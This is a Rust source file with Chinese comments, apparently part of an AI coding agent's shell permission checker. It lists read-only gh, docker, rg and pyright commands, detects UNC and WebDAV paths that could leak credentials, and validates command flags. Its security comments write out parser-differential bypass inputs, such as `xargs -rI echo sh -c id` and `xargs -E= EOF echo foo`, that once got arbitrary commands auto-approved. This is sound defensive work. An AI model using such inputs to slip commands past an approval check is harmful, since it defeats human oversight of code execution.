                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh auth status 是只读 — 显示认证状态
        commands.insert(
            "gh auth status",
            ExternalCommandConfig::flags(GH_AUTH_STATUS_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh pr status 是只读 — 显示你的 PR
        commands.insert(
            "gh pr status",
            ExternalCommandConfig::flags(GH_PR_STATUS_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh issue status 是只读 — 显示你的 issue
        commands.insert(
            "gh issue status",
            ExternalCommandConfig::flags(GH_ISSUE_STATUS_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh release list 是只读 — 列出 release
        commands.insert(
            "gh release list",
            ExternalCommandConfig::flags(GH_RELEASE_LIST_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh release view 是只读 — 显示 release 详情
        commands.insert(
            "gh release view",
            ExternalCommandConfig::flags(GH_RELEASE_VIEW_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh workflow list 是只读 — 列出 workflow 文件
        commands.insert(
            "gh workflow list",
            ExternalCommandConfig::flags(GH_WORKFLOW_LIST_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh workflow view 是只读 — 显示 workflow 概要
        commands.insert(
            "gh workflow view",
            ExternalCommandConfig::flags(GH_WORKFLOW_VIEW_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh label list 是只读 — 列出 label
        commands.insert(
            "gh label list",
            ExternalCommandConfig::flags(GH_LABEL_LIST_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh search repos 是只读 — 搜索仓库
        commands.insert(
            "gh search repos",
            ExternalCommandConfig::flags(GH_SEARCH_REPOS_FLAGS),
        );
        // gh search issues 是只读 — 搜索 issue
        commands.insert(
            "gh search issues",
            ExternalCommandConfig::flags(GH_SEARCH_ISSUES_FLAGS),
        );
        // gh search prs 是只读 — 搜索 PR
        commands.insert(
            "gh search prs",
            ExternalCommandConfig::flags(GH_SEARCH_PRS_FLAGS),
        );
        // gh search commits 是只读 — 搜索提交
        commands.insert(
            "gh search commits",
            ExternalCommandConfig::flags(GH_SEARCH_COMMITS_FLAGS),
        );
        // gh search code 是只读 — 搜索代码
        commands.insert(
            "gh search code",
            ExternalCommandConfig::flags(GH_SEARCH_CODE_FLAGS),
        );
        commands
    });

// ---------------------------------------------------------------------------
// DOCKER_READ_ONLY_COMMANDS — docker inspect/logs 只读命令
// ---------------------------------------------------------------------------

const DOCKER_LOGS_FLAGS: &[(&str, FlagArgType)] = &[
    ("--follow", FlagArgType::None),
    ("-f", FlagArgType::None),
    ("--tail", FlagArgType::String),
    ("-n", FlagArgType::String),
    ("--timestamps", FlagArgType::None),
    ("-t", FlagArgType::None),
    ("--since", FlagArgType::String),
    ("--until", FlagArgType::String),
    ("--details", FlagArgType::None),
];

const DOCKER_INSPECT_FLAGS: &[(&str, FlagArgType)] = &[
    ("--format", FlagArgType::String),
    ("-f", FlagArgType::String),
    ("--type", FlagArgType::String),
    ("--size", FlagArgType::None),
    ("-s", FlagArgType::None),
];

pub static DOCKER_READ_ONLY_COMMANDS: Lazy<HashMap<&'static str, ExternalCommandConfig>> =
    Lazy::new(|| {
        let mut commands = HashMap::new();
        commands.insert(
            "docker logs",
            ExternalCommandConfig::flags(DOCKER_LOGS_FLAGS),
        );
        commands.insert(
            "docker inspect",
            ExternalCommandConfig::flags(DOCKER_INSPECT_FLAGS),
        );
        commands
    });

// ---------------------------------------------------------------------------
// RIPGREP_READ_ONLY_COMMANDS — rg (ripgrep) 只读搜索
// ---------------------------------------------------------------------------

const RIPGREP_FLAGS: &[(&str, FlagArgType)] = &[
    // pattern flag
    ("-e", FlagArgType::String), // 搜索的 pattern
    ("--regexp", FlagArgType::String),
    ("-f", FlagArgType::String), // 从文件读取 pattern
    // 常见搜索选项
    ("-i", FlagArgType::None), // 忽略大小写
    ("--ignore-case", FlagArgType::None),
    ("-S", FlagArgType::None), // 智能大小写
    ("--smart-case", FlagArgType::None),
    ("-F", FlagArgType::None), // 固定字符串
    ("--fixed-strings", FlagArgType::None),
    ("-w", FlagArgType::None), // 单词正则
    ("--word-regexp", FlagArgType::None),
    ("-v", FlagArgType::None), // 反转匹配
    ("--invert-match", FlagArgType::None),
    // 输出选项
    ("-c", FlagArgType::None), // 计数匹配
    ("--count", FlagArgType::None),
    ("-l", FlagArgType::None), // 匹配的文件
    ("--files-with-matches", FlagArgType::None),
    ("--files-without-match", FlagArgType::None),
    ("-n", FlagArgType::None), // 行号
    ("--line-number", FlagArgType::None),
    ("-o", FlagArgType::None), // 仅匹配部分
    ("--only-matching", FlagArgType::None),
    ("-A", FlagArgType::Number), // 之后上下文
    ("--after-context", FlagArgType::Number),
    ("-B", FlagArgType::Number), // 之前上下文
    ("--before-context", FlagArgType::Number),
    ("-C", FlagArgType::Number), // 上下文
    ("--context", FlagArgType::Number),
    ("-H", FlagArgType::None), // 带文件名
    ("-h", FlagArgType::None), // 无文件名
    ("--heading", FlagArgType::None),
    ("--no-heading", FlagArgType::None),
    ("-q", FlagArgType::None), // 安静
    ("--quiet", FlagArgType::None),
    ("--column", FlagArgType::None),
    // 文件过滤
    ("-g", FlagArgType::String), // glob
    ("--glob", FlagArgType::String),
    ("-t", FlagArgType::String), // 类型
    ("--type", FlagArgType::String),
    ("-T", FlagArgType::String), // 排除类型
    ("--type-not", FlagArgType::String),
    ("--type-list", FlagArgType::None),
    ("--hidden", FlagArgType::None),
    ("--no-ignore", FlagArgType::None),
    ("-u", FlagArgType::None), // 不受限
    // 常见选项
    ("-m", FlagArgType::Number), // 每文件最大计数
    ("--max-count", FlagArgType::Number),
    ("-d", FlagArgType::Number), // 最大深度
    ("--max-depth", FlagArgType::Number),
    ("-a", FlagArgType::None), // 文本（搜索二进制文件）
    ("--text", FlagArgType::None),
    ("-z", FlagArgType::None), // 搜索 zip
    ("-L", FlagArgType::None), // 跟随符号链接
    ("--follow", FlagArgType::None),
    // 显示选项
    ("--color", FlagArgType::String),
    ("--json", FlagArgType::None),
    ("--stats", FlagArgType::None),
    // 帮助与版本
    ("--help", FlagArgType::None),
    ("--version", FlagArgType::None),
    ("--debug", FlagArgType::None),
    // 特殊参数分隔符
    ("--", FlagArgType::None),
];

pub static RIPGREP_READ_ONLY_COMMANDS: Lazy<HashMap<&'static str, ExternalCommandConfig>> =
    Lazy::new(|| {
        let mut commands = HashMap::new();
        commands.insert("rg", ExternalCommandConfig::flags(RIPGREP_FLAGS));
        commands
    });

// ---------------------------------------------------------------------------
// PYRIGHT_READ_ONLY_COMMANDS — pyright 静态类型检查器
// ---------------------------------------------------------------------------

/// 检查 --watch 或 -w 是否作为独立 token（flag）出现。
fn pyright_is_dangerous(_raw_command: &str, args: &[String]) -> bool {
    args.iter().any(|t| t == "--watch" || t == "-w")
}

const PYRIGHT_FLAGS: &[(&str, FlagArgType)] = &[
    ("--outputjson", FlagArgType::None),
    ("--project", FlagArgType::String),
    ("-p", FlagArgType::String),
    ("--pythonversion", FlagArgType::String),
    ("--pythonplatform", FlagArgType::String),
    ("--typeshedpath", FlagArgType::String),
    ("--venvpath", FlagArgType::String),
    ("--level", FlagArgType::String),
    ("--stats", FlagArgType::None),
    ("--verbose", FlagArgType::None),
    ("--version", FlagArgType::None),
    ("--dependencies", FlagArgType::None),
    ("--warnings", FlagArgType::None),
];

pub static PYRIGHT_READ_ONLY_COMMANDS: Lazy<HashMap<&'static str, ExternalCommandConfig>> =
    Lazy::new(|| {
        let mut commands = HashMap::new();
        commands.insert(
            "pyright",
            ExternalCommandConfig::flags(PYRIGHT_FLAGS)
                .no_double_dash() // pyright 把 -- 当文件路径，不是 end-of-options
                .with_callback(pyright_is_dangerous as DangerousCallback),
        );
        commands
    });

// ---------------------------------------------------------------------------
// EXTERNAL_READONLY_COMMANDS — 跨 shell 只读命令
// 仅在 Windows 上 bash 与 PowerShell 中行为一致的命令。
// Unix 专属命令（cat, head, wc 等）属于 BashTool 的 READONLY_COMMANDS。
// ---------------------------------------------------------------------------

/// TS: `EXTERNAL_READONLY_COMMANDS: readonly string[]`
pub const EXTERNAL_READONLY_COMMANDS: &[&str] = &[
    // 跨平台外部工具，在 Windows 的 bash 与 PowerShell 中行为一致
    "docker ps",
    "docker images",
];

// ---------------------------------------------------------------------------
// UNC 路径检测（Bash 与 PowerShell 共享）
// ---------------------------------------------------------------------------

/// 检查路径或命令是否包含可能触发网络请求的 UNC 路径
/// （NTLM/Kerberos 凭据泄漏、WebDAV 攻击）。
///
/// 检测：
/// - 基础 UNC 路径：\\server\share, \\foo.com\file
/// - WebDAV 模式：\\server@SSL@8443\, \\server@8443@SSL\, \\server\DavWWWRoot\
/// - IP 形式 UNC：\\192.168.1.1\share, \\[2001:db8::1]\share
/// - 正斜杠变体：//server/share
pub fn contains_vulnerable_unc_path(path_or_command: &str) -> bool {
    // 仅在 Windows 平台检查。platform.ts 中只有 process.platform === 'win32'
    // 映射 'windows'，与 std::env::consts::OS == "windows" 等价。
    if std::env::consts::OS != "windows" {
        return false;
    }

    // NOTE: 下面每次调用编译 Regex（模式为静态字面量，编译为 µs 级；
    // 本函数每命令最多调用一次）。once_cell 静态初始化需要 unwrap/expect，
    // 依仓库纪律改为按需编译，编译失败（理论上不可能）时对应规则不匹配。
    let compile = |pattern: &str| Regex::new(pattern);

    // 1. 反斜杠 UNC 路径
    // 匹配：\\server, \\server\share, \\server/share, \\server@port\share
    // 用 [^\s\\/]+ 匹配主机名以捕获 Unicode 同形字等非 ASCII 字符
    // 结尾同时接受 \ 与 /（Windows 把两者都当路径分隔符）
    if let Ok(re) = compile(r"(?i)\\[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)") {
        if re.is_match(path_or_command) {
            return true;
        }
    }

    // 2. 正斜杠 UNC 路径
    // 匹配：//server, //server/share, //server\share, //192.168.1.1/share
    // TS 用负向先行断言 (?<!:) 排除 URL（https://, http://, ftp://），
    // 同时捕获前面是引号、= 或其他非冒号字符的 //。
    // Rust regex crate 不支持先行断言，改为手动扫描等价实现：
    // 找到每个 "//" 出现位置，仅当其前一个字符不是 ':' 时，
    // 用去掉先行断言的模式匹配尾部。
    if let Ok(re) = compile(r"(?i)^[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)") {
        let mut search_from = 0usize;
        while let Some(pos) = path_or_command[search_from..].find("//") {
            let abs = search_from + pos;
            // 前一个字符不是 ':'（i == 0 时无前置字符，先行断言成立）
            let prev_is_not_colon = path_or_command[..abs]
                .chars()
                .next_back()
                .map(|c| c != ':')
                .unwrap_or(true);
            if prev_is_not_colon {
                let tail = &path_or_command[abs + 2..];
                if re.is_match(tail) {
                    return true;
                }
            }
            search_from = abs + 1;
        }
    }

    // 3. 混合分隔符 UNC 路径（正斜杠 + 反斜杠）
    // 在 Windows/Cygwin 上 /\ 等价于 //，两者都是路径分隔符。
    // 在 bash 中 /\\server 经转义处理后变为 /\server，即 UNC 路径。
    // / 之后要求 2+ 个反斜杠：单个反斜杠只转义下一个字符
    // （如 /\a → bash 处理后为 /a，不是 UNC 路径）。
    if let Ok(re) = compile(r"/\\{2,}[^\s\\/]") {
        if re.is_match(path_or_command) {
            return true;
        }
    }

    // 4. 混合分隔符 UNC 路径（反斜杠 + 正斜杠）
    // bash 中 \\/server 经转义处理后变为 \/server，
    // 在 Windows 上是 UNC 路径（\ 与 / 都是路径分隔符）。
    if let Ok(re) = compile(r"\\{2,}/[^\s\\/]") {
        if re.is_match(path_or_command) {
            return true;
        }
    }

    // 5. WebDAV SSL/端口模式
    // 示例：\\server@SSL@8443\path, \\server@8443@SSL\path
    if let Ok(re) = compile(r"(?i)@SSL@\d+") {
        if re.is_match(path_or_command) {
            return true;
        }
    }
    if let Ok(re) = compile(r"(?i)@\d+@SSL") {
        if re.is_match(path_or_command) {
            return true;
        }
    }

    // 6. DavWWWRoot 标记（Windows WebDAV 重定向器）
    // 示例：\\server\DavWWWRoot\path
    if let Ok(re) = compile(r"(?i)DavWWWRoot") {
        if re.is_match(path_or_command) {
            return true;
        }
    }

    // 7. IPv4 地址的 UNC 路径（显式检查，纵深防御）
    // 示例：\\192.168.1.1\share, \\10.0.0.1\path
    if let Ok(re) = compile(r"^\\(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]") {
        if re.is_match(path_or_command) {
            return true;
        }
    }
    if let Ok(re) = compile(r"^/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]") {
        if re.is_match(path_or_command) {
            return true;
        }
    }

    // 8. 方括号 IPv6 地址的 UNC 路径（显式检查，纵深防御）
    // 示例：\\[2001:db8::1]\share, \\[::1]\path
    if let Ok(re) = compile(r"^\\(\[[\da-fA-F:]+\])[\\/]") {
        if re.is_match(path_or_command) {
            return true;
        }
    }
    if let Ok(re) = compile(r"^/(\[[\da-fA-F:]+\])[\\/]") {
        if re.is_match(path_or_command) {
            return true;
        }
    }

    false
}

// ---------------------------------------------------------------------------
// flag 校验工具
// ---------------------------------------------------------------------------

/// TS: `FLAG_PATTERN = /^-[a-zA-Z0-9_-]/`。
/// 匹配合法 flag 名（字母、数字、下划线、连字符）：以 `-` 开头，
/// 第二个字符为 ASCII 字母数字、`_` 或 `-`。
pub fn is_flag_pattern(token: &str) -> bool {
    let mut chars = token.chars();
    if chars.next() != Some('-') {
        return false;
    }
    matches!(
        chars.next(),
        Some(c) if c.is_ascii_alphanumeric() || c == '_' || c == '-'
    )
}

/// TS: `validateFlagArgument`。按预期类型校验 flag 参数。
pub fn validate_flag_argument(value: &str, arg_type: FlagArgType) -> bool {
    match arg_type {
        FlagArgType::None => false, // 'none' 类型不应调用本函数
        FlagArgType::Number => !value.is_empty() && value.bytes().all(|b| b.is_ascii_digit()),
        FlagArgType::String => true, // 任意字符串（含空串）都合法
        // TS `value.length === 1` — UTF-16 码元计数；非 BMP 字符长度为 2
        FlagArgType::Char => value.encode_utf16().count() == 1,
        FlagArgType::BracesLiteral => value == "{}",
        FlagArgType::Eof => value == "EOF",
    }
}

/// `validate_flags` 的选项（TS 同名 options）。
#[derive(Debug, Clone, Default)]
pub struct ValidateFlagsOptions<'a> {
    /// 命令名，用于命令特定处理（git 数字简写、grep/rg 附着数字）
    pub command_name: Option<&'a str>,
    /// 原始命令，传给 `additionalCommandIsDangerousCallback`
    pub raw_command: Option<&'a str>,
    /// 提供时启用 xargs 风格的目标命令检测
    pub xargs_target_commands: Option<&'a [&'a str]>,
}

/// 对 token 化命令的 flag/参数部分按配置做校验。
/// 这是从 BashTool 的 isCommandSafeViaFlagParsing 抽取的 flag 行走循环。
///
/// - `tokens`：预 tokenize 的参数（来自 bash shell-quote 或 PowerShell AST）
/// - `start_index`：开始校验的位置（命令 token 之后）
/// - `config`：安全 flag 配置
/// - `options.command_name`：用于命令特定处理（git 数字简写、grep/rg 附着数字）
/// - `options.raw_command`：传给 `additionalCommandIsDangerousCallback`
/// - `options.xargs_target_commands`：提供时启用 xargs 风格目标命令检测
///
/// 全部 flag 合法返回 true，否则 false。
pub fn validate_flags(
    tokens: &[String],
    start_index: usize,
    config: &ExternalCommandConfig,
    options: Option<&ValidateFlagsOptions<'_>>,
) -> bool {
    let mut i = start_index;

    while i < tokens.len() {
        let mut token: &str = tokens[i].as_str();
        if token.is_empty() {
            i += 1;
            continue;
        }

        // xargs 特殊处理：找到目标命令后停止校验 flag
        if let Some(opts) = options {
            if let Some(targets) = opts.xargs_target_commands {
                if opts.command_name == Some("xargs")
                    && (!token.starts_with('-') || token == "--")
                {
                    if token == "--" && i + 1 < tokens.len() {
                        i += 1;
                        token = tokens[i].as_str();
                    }
                    if !token.is_empty() && targets.contains(&token) {
                        break;
                    }
                    return false;
                }
            }
        }

        if token == "--" {
            // SECURITY: 仅当工具遵循 POSIX `--`（默认 true）时才中断。
            // pyright 等工具不遵循 `--` — 把它当文件路径，继续把后续 token
            // 当 flag 处理。此处中断会让 `pyright -- --createstub os`
            // 自动批准一个文件写入 flag。
            if config.respects_double_dash {
                i += 1;
                break; // -- 之后全部是参数
            }
            // 工具不遵循 --：按位置参数处理，继续校验
            i += 1;
            continue;
        }

        if token.starts_with('-') && token.len() > 1 && is_flag_pattern(token) {
            // 处理 --flag=value 格式
            // SECURITY: 用 token 是否【包含】 `=` 与值是否非空分开跟踪。
            // `-E=` 的 hasEquals=true 但 inlineValue=''（假值）。没有
            // hasEquals 时，下面的假值检查会落到「消费下一个 token」—
            // 但 GNU getopt 对短选项的必需参数把 `-E=` 当作带附着参数 `=`
            // 的 `-E`（短选项不剥离 `=`）。解析器差异：校验器前进 2 个
            // token，GNU 前进 1 个。
            //
            // 攻击：`xargs -E= EOF echo foo`（零权限）
            //   校验器：inlineValue='' 为假 → 把 EOF 当 -E 参数 → i+=2 →
            //     echo ∈ SAFE_TARGET_COMMANDS_FOR_XARGS → 中断 → 自动放行
            //   GNU xargs: -E 附着参数 `=` → EOF 是目标命令 → 代码执行
            //
            // 修复：hasEquals 为 true 时用 inlineValue（即使为空）作为已
            // 提供的参数。validateFlagArgument('', 'EOF') → false → 拒绝。
            // 这对所有参数类型都正确：用户显式输入了 `=`，表明提供了值
            //（空）。不要消费下一个 token。
            let has_equals = token.contains('=');
            let (flag, inline_value) = match token.find('=') {
                Some(idx) => (&token[..idx], &token[idx + 1..]),
                None => (token, ""),
            };

            if flag.is_empty() {
                return false;
            }

            let flag_arg_type = match config.flag_arg_type(flag) {
                Some(ty) => ty,
                None => {
                    // 特殊情况：git 命令支持 -<数字> 作为 -n <数字> 的简写
                    if options.is_some_and(|o| o.command_name == Some("git"))
                        && flag.starts_with('-')
                        && flag.len() > 1
                        && !flag[1..].is_empty()
                        && flag[1..].bytes().all(|b| b.is_ascii_digit())
                    {
                        // 等价 -n flag，对 git log/diff/show 安全
                        i += 1;
                        continue;
                    }

                    // 处理直接附着数字参数的 flag（如 -A20, -B10）
                    // 仅对 grep 与 rg 命令应用此特殊处理
                    if options.is_some_and(|o| {
                        o.command_name == Some("grep") || o.command_name == Some("rg")
                    }) && flag.starts_with('-')
                        && !flag.starts_with("--")
                        && flag.len() > 2
                    {
                        let potential_flag = &flag[..2]; // 如 '-A'（'-A20'）
                        let potential_value = &flag[2..]; // 如 '20'（'-A20'）

                        if let Some(potential_type) = config.flag_arg_type(potential_flag) {
                            // /^\d+$/：非空且全为 ASCII 数字
                            if !potential_value.is_empty()
                                && potential_value.bytes().all(|b| b.is_ascii_digit())
                            {
                                // 附着数字参数的 flag
                                if matches!(
                                    potential_type,
                                    FlagArgType::Number | FlagArgType::String
                                ) {
                                    // 校验数字值
                                    if validate_flag_argument(potential_value, potential_type) {
                                        i += 1;
                                        continue;
                                    }
                                    return false; // 非法附着值
                                }
                            }
                        }
                    }

                    // 处理 -nr 之类组合单字母 flag
                    // SECURITY: 绝不能允许任何带参数的捆绑 flag。
                    // GNU getopt 捆绑语义：带参数选项出现在捆绑末尾且无尾随
                    // 字符时，下一个 argv 元素被消费为参数。所以 xargs 把
                    // `xargs -rI echo sh -c id` 解析为：
                    //   -r（无参）+ -I 且 replace-str=`echo`，目标=`sh -c id`
                    // 此前朴素的处理只检查 safeFlags 中是否存在（`-r: 'none'`
                    // 与 `-I: '{}'` 都为真值），随后 `i++` 只消费 1 个 token。
                    // 这造成解析器差异：校验器以为 `echo` 是 xargs 目标
                    // （在 SAFE_TARGET_COMMANDS_FOR_XARGS 中 → 中断），但
                    // xargs 实际执行了 `sh -c id`。仅凭 Bash(echo:*) 或更低
                    // 权限即任意 RCE。
                    //
                    // 修复：要求所有捆绑 flag 的参数类型为 'none'。任一捆绑
                    // flag 需要参数（非 'none'）就拒绝整个捆绑。这是保守的 —
                    // 完全阻止 `-rI`（xargs），但方向安全。需要 `-I` 可单独
                    // 使用：`-r -I {}`。
                    if flag.starts_with('-') && !flag.starts_with("--") && flag.len() > 2 {
                        for c in flag.chars().skip(1) {
                            let single_flag: String = format!("-{c}");
                            let flag_type = config.flag_arg_type(&single_flag);
                            if flag_type.is_none() {
                                return false; // 组合中存在未知 flag
                            }
                            // SECURITY: 捆绑 flag 必须是无参类型。带参 flag 在
                            // 捆绑中会消费 GNU getopt 的下一个 token，本处理器
                            // 不建模此行为。拒绝以避免解析器差异。
                            if flag_type != Some(FlagArgType::None) {
                                return false; // 捆绑中含带参 flag — 无法安全校验
                            }
                        }
                        i += 1;
                        continue;
                    }
                    return false; // 未知 flag
                }
            };

            // 校验 flag 参数
            if flag_arg_type == FlagArgType::None {
                // SECURITY: hasEquals 覆盖 `-FLAG=`（空内联值）。没有它，
                // 'none' 类型的 `-FLAG=` 会通过（inlineValue='' 为假值）。
                if has_equals {
                    return false; // 该 flag 不应有值
                }
                i += 1;
            } else {
                let arg_value: &str;
                // SECURITY: 用 has_equals（非 inlineValue 真值）。`-E=` 不能
                // 消费下一个 token — 用户显式提供了空值。
                if has_equals {
                    arg_value = inline_value;
                    i += 1;
                } else {
                    // 检查下一个 token 是否为参数
                    if i + 1 >= tokens.len() {
                        return false; // 缺少必需参数
                    }
                    let next = tokens[i + 1].as_str();
                    if !next.is_empty()
                        && next.starts_with('-')
                        && next.len() > 1
                        && is_flag_pattern(next)
                    {
                        return false; // 缺少必需参数
                    }
                    arg_value = next;
                    i += 2;
                }

                // 纵深防御：对 string 参数拒绝以 '-' 开头的值。
                // 防止类型混淆攻击：被标为 'string' 但实际不带参数的 flag
                // 被利用注入危险 flag。
                // 例外：git 的 --sort flag 的值可以以 '-' 开头（反向排序）
                if flag_arg_type == FlagArgType::String && arg_value.starts_with('-') {
                    // 特殊情况：git 的 --sort flag 允许 - 前缀做反向排序
                    let is_git_reverse_sort = flag == "--sort"
                        && options.is_some_and(|o| o.command_name == Some("git"))
                        && arg_value
                            .chars()
                            .nth(1)
                            .is_some_and(|c| c.is_ascii_alphabetic());
                    if !is_git_reverse_sort {
                        return false;
                    }
                }

                // 按类型校验参数
                if !validate_flag_argument(arg_value, flag_arg_type) {
                    return false;
                }
            }
        } else {
            // 非 flag 参数（如 revision spec、文件路径等）— 允许
            i += 1;
        }
    }

    true
}
